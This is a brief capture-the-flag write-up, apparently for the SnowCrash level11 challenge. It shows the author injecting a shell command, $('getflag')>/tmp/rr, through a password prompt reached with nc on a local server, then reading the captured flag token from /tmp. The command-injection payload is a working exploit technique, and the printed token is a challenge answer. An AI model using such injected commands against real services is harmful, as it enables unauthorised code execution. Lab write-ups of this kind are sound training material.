Now it s a server that his running on the back.
What we need to do it's making it execute the function get flag.
If we can it, we can see that he is calling echo with the password we give as a parametter. So we just need to redirect the getflag.

nc 127.0.0.1 5151
Password: $('getflag')>/tmp/rr
Erf nope..
level11@SnowCrash:~$ cat /tmp/rr
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

flag = fa6v5ateaw21peobuub8ipe6s
